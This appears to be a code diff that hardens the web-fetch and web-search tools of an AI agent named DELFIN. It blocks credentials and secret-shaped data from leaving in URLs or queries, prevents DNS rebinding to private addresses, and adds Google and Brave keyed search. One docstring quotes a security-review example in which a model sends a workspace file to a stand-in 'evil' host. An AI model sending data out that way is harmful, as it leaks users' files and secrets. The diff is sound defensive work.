@@ -25,8 +25,10 @@ install (no extra ``requests`` / ``beautifulsoup4`` dependency).
 from __future__ import annotations
 
 import html as _html
+import http.client
 import ipaddress
 import json
+import os
 import re
 import socket
 import time
@@ -78,8 +80,73 @@ class SearchHit:
     snippet: str
 
 
+# Carrier-grade NAT space is not ``is_private`` in Python 3.13, and cluster
+# and VPN internals live there.
+_CGNAT_NET = ipaddress.ip_network("100.64.0.0/10")
+# A lookup URL has no business carrying this much data.
+_MAX_QUERY_CHARS = 2000
+
+
+def _known_secret_values() -> list[str]:
+    """The values of every credential DELFIN holds (store + well-known env),
+    for an exact-match egress check. Never raises; short values ignored."""
+    out: list[str] = []
+    try:
+        from .credentials import _WELL_KNOWN_KEYS, _read_store
+        for val in (_read_store() or {}).values():
+            if isinstance(val, str) and len(val) >= 12:
+                out.append(val)
+        for name in _WELL_KNOWN_KEYS:
+            val = os.environ.get(name, "")
+            if len(val) >= 12:
+                out.append(val)
+    except Exception:
+        pass
+    return out
+
+
+def outbound_secret_reason(text: str) -> Optional[str]:
+    """Why ``text`` must not leave the machine (a URL or a search query), or None.
+
+    Security review 2026-09-16: web_fetch and web_search sent whatever the
+    model put into them -- web_fetch("https://evil/?d=<a workspace file>")
+    went straight out, and a search query reaches up to five third parties.
+    Refused: a credential DELFIN holds (exact value, also URL-encoded), any
+    shape the output guard redacts (API keys, tokens, private keys,
+    password assignments, passwords in URLs), and a query too long to be a
+    lookup.
+    """
+    raw = str(text or "")
+    try:
+        decoded = urllib.parse.unquote_plus(raw)
+    except Exception:
+        decoded = raw
+    for secret in _known_secret_values():
+        if secret in raw or secret in decoded:
+            return "it contains a credential DELFIN holds"
+    try:
+        from .output_guard import _redact_secrets
+        findings: list = []
+        _redact_secrets(decoded, findings)
+        if findings:
+            return "it contains something shaped like a secret (key, token or password)"
+    except Exception:
+        pass
+    try:
+        query = urllib.parse.urlparse(raw).query
+    except Exception:
+        query = ""
+    if len(query) > _MAX_QUERY_CHARS:
+        return f"its query string is {len(query)} characters, too long to be a lookup"
+    return None
+
+
 def _check_url(url: str) -> Optional[str]:
     """Return an error string if the URL is forbidden, else None."""
+    why = outbound_secret_reason(url)
+    if why:
+        return (f"refused to send this URL: {why}. Nothing was sent; "
+                "remove the data from the URL")
     try:
         parsed = urllib.parse.urlparse(url)
     except Exception as exc:
@@ -105,7 +172,8 @@ def _check_url(url: str) -> Optional[str]:
             except ValueError:
                 continue
             if ip.is_loopback or ip.is_link_local or ip.is_private \
-                    or ip.is_multicast or ip.is_reserved:
+                    or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
+                    or ip in _CGNAT_NET:
                 return (
                     f"resolved IP {ip_str} for host {host!r} is "
                     "private/loopback/link-local — refused"
@@ -128,26 +196,109 @@ class _GuardedRedirectHandler(urllib.request.HTTPRedirectHandler):
         return super().redirect_request(req, fp, code, msg, headers, newurl)
 
 
+def _ip_refusal(ip_str: str, host: str) -> Optional[str]:
+    try:
+        ip = ipaddress.ip_address(ip_str.split("%", 1)[0])
+    except ValueError:
+        return f"unparseable address {ip_str!r} for host {host!r}"
+    if getattr(ip, "ipv4_mapped", None) is not None:
+        ip = ip.ipv4_mapped
+    if ip.is_loopback or ip.is_link_local or ip.is_private \
+            or ip.is_multicast or ip.is_reserved or ip.is_unspecified \
+            or ip in _CGNAT_NET:
+        return (f"resolved IP {ip_str} for host {host!r} is "
+                "private/loopback/link-local — refused")
+    return None
+
+
+def _checked_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
+                               source_address=None, **_kw):
+    """``socket.create_connection`` that connects only to an address it has
+    just checked.
+
+    ``_check_url`` resolved the name and urllib resolved it again to
+    connect: a name that answers with a public address the first time and
+    127.0.0.1 or the cloud metadata address the second (DNS rebinding)
+    passed the check and reached the private one. Here the name is resolved
+    once, each address is checked, and the socket goes to that address."""
+    host, port = address
+    last: Optional[BaseException] = None
+    refusal = ""
+    for af, socktype, proto, _canon, sockaddr in socket.getaddrinfo(
+            host, port, 0, socket.SOCK_STREAM):
+        why = _ip_refusal(str(sockaddr[0]), str(host))
+        if why:
+            refusal = why
+            continue
+        sock = None
+        try:
+            sock = socket.socket(af, socktype, proto)
+            if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:
+                sock.settimeout(timeout)
+            if source_address:
+                sock.bind(source_address)
+            sock.connect(sockaddr)
+            return sock
+        except OSError as exc:
+            last = exc
+            if sock is not None:
+                sock.close()
+    if refusal:
+        raise OSError(f"refused: {refusal}")
+    raise last if last is not None else OSError(f"no address for {host!r}")
+
+
+class _CheckedHTTPConnection(http.client.HTTPConnection):
+    def __init__(self, *a, **kw):
+        super().__init__(*a, **kw)
+        self._create_connection = _checked_create_connection
+
+
+class _CheckedHTTPSConnection(http.client.HTTPSConnection):
+    def __init__(self, *a, **kw):
+        super().__init__(*a, **kw)
+        self._create_connection = _checked_create_connection
+
+
+class _CheckedHTTPHandler(urllib.request.HTTPHandler):
+    def http_open(self, req):
+        # Through a configured proxy the connection goes to the proxy, which
+        # resolves the name itself; the URL was still checked beforehand.
+        cls = http.client.HTTPConnection if req.has_proxy() else _CheckedHTTPConnection
+        return self.do_open(cls, req)
+
+
+class _CheckedHTTPSHandler(urllib.request.HTTPSHandler):
+    def https_open(self, req):
+        cls = (http.client.HTTPSConnection if getattr(req, "_tunnel_host", None)
+               else _CheckedHTTPSConnection)
+        return self.do_open(cls, req, context=self._context)
+
+
 _GUARDED_OPENER = None
 
 
 def _guarded_opener():
     global _GUARDED_OPENER
     if _GUARDED_OPENER is None:
-        _GUARDED_OPENER = urllib.request.build_opener(_GuardedRedirectHandler())
+        _GUARDED_OPENER = urllib.request.build_opener(
+            _GuardedRedirectHandler(), _CheckedHTTPHandler(),
+            _CheckedHTTPSHandler())
     return _GUARDED_OPENER
 
 
 def _fetch_bytes(url: str, timeout_s: int,
-                 want_status: bool = False):
+                 want_status: bool = False, headers: Optional[dict] = None):
     """GET a URL with a strict cap. Returns (body, content_type).
 
     With ``want_status`` the HTTP status comes along as a third element:
     a search endpoint answering 202 has served a challenge page, not an
     empty result set, and the caller has to be able to tell those apart.
+    ``headers`` are added to the request (a keyed engine's token).
     """
     req = urllib.request.Request(
-        url, headers={"User-Agent": _USER_AGENT, "Accept": "text/html,*/*"}
+        url, headers={"User-Agent": _USER_AGENT, "Accept": "text/html,*/*",
+                      **(headers or {})}
     )
     # Use the redirect-guarding opener so each hop is re-checked against the
     # deny-list (the initial URL is already validated by the caller).
@@ -338,6 +489,93 @@ def _ddg_instant_answer(query: str, timeout_s: int) -> list[dict]:
 _RESET_ATTEMPTS = 3
 
 
+# ---------------------------------------------------------------------------
+# Keyed engines: a real search index when the user has a key for one.
+# ---------------------------------------------------------------------------
+#
+# DuckDuckGo's HTML endpoint is scraped and challenged; OpenAlex and
+# Wikipedia are indexes, not the web. With a key the agent searches the way
+# an assistant with a search API does. Keys come from the credential store
+# (env var or ~/.delfin credential file): GOOGLE_CSE_API_KEY + GOOGLE_CSE_CX
+# for Google's Custom Search JSON API, BRAVE_SEARCH_API_KEY for Brave
+# Search. Absent keys cost nothing; a failing keyed engine falls through to
+# the keyless chain and is named in the error.
+
+def _credential(name: str) -> str:
+    try:
+        from .credentials import load_credential
+        return str(load_credential(name) or "").strip()
+    except Exception:
+        return ""
+
+
+def _google_cse_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    key, cx = _credential("GOOGLE_CSE_API_KEY"), _credential("GOOGLE_CSE_CX")
+    if not key or not cx:
+        return []
+    url = ("https://www.googleapis.com/customsearch/v1?"
+           + urllib.parse.urlencode({"key": key, "cx": cx, "q": query,
+                                     "num": max(1, min(int(max_results), 10))}))
+    body, _ctype = _fetch_bytes(url, timeout_s)[:2]
+    data = json.loads(body.decode("utf-8", errors="replace"))
+    hits = []
+    for item in data.get("items") or []:
+        link = str(item.get("link") or "")
+        if link.startswith(("http://", "https://")):
+            hits.append({"title": str(item.get("title") or "").strip(),
+                         "url": link,
+                         "snippet": str(item.get("snippet") or "").strip()[:300],
+                         "index": "google"})
+    return hits[:max_results]
+
+
+def _brave_search(query: str, max_results: int, timeout_s: int) -> list[dict]:
+    key = _credential("BRAVE_SEARCH_API_KEY")
+    if not key:
+        return []
+    url = ("https://api.search.brave.com/res/v1/web/search?"
+           + urllib.parse.urlencode({"q": query, "count": max(1, min(int(max_results), 20))}))
+    body, _ctype = _fetch_bytes(url, timeout_s, headers={
+        "Accept": "application/json", "X-Subscription-Token": key})[:2]
+    data = json.loads(body.decode("utf-8", errors="replace"))
+    hits = []
+    for item in ((data.get("web") or {}).get("results") or []):
+        link = str(item.get("url") or "")
+        if link.startswith(("http://", "https://")):
+            hits.append({"title": str(item.get("title") or "").strip(),
+                         "url": link,
+                         "snippet": str(item.get("description") or "").strip()[:300],
+                         "index": "brave"})
+    return hits[:max_results]
+
+
+_KEYED_ENGINES = (("google", _google_cse_search), ("brave", _brave_search))
+
+
+def keyed_engines_configured() -> list[str]:
+    """Which keyed engines have a key here, by name."""
+    out = []
+    if _credential("GOOGLE_CSE_API_KEY") and _credential("GOOGLE_CSE_CX"):
+        out.append("google")
+    if _credential("BRAVE_SEARCH_API_KEY"):
+        out.append("brave")
+    return out
+
+
+def _keyed_search(query: str, max_results: int, timeout_s: int) -> tuple[list[dict], str, str]:
+    """(hits, source, error) from the first keyed engine that answers."""
+    error = ""
+    for name, fn in _KEYED_ENGINES:
+        try:
+            hits = fn(query, max_results, timeout_s)
+        except Exception as exc:
+            error = f"{name}: {type(exc).__name__}: {str(exc)[:80]}"
+            continue
+        if hits:
+            return hits, name, ""
+    return [], "", error
+
+
 def _is_connection_reset(exc: BaseException) -> bool:
     """A connection the peer reset, however the platform spells it."""
     reason = getattr(exc, "reason", exc)
@@ -353,6 +591,13 @@ def web_search(query: str, *, max_results: int = 8,
     when the HTML endpoint returns nothing (e.g. blocked by a 202 anomaly)."""
     if not query.strip():
         return {"error": "query must be non-empty"}
+    _why = outbound_secret_reason(query)
+    if _why:
+        return {"error": f"refused to send this search query: {_why}. "
+                         "Nothing was sent to any search engine."}
+    keyed_hits, keyed_source, keyed_error = _keyed_search(query, max_results, timeout_s)
+    if keyed_hits:
+        return {"query": query, "results": keyed_hits, "source": keyed_source}
     encoded = urllib.parse.urlencode({"q": query})
     url = f"https://duckduckgo.com/html/?{encoded}"
     err = _check_url(url)
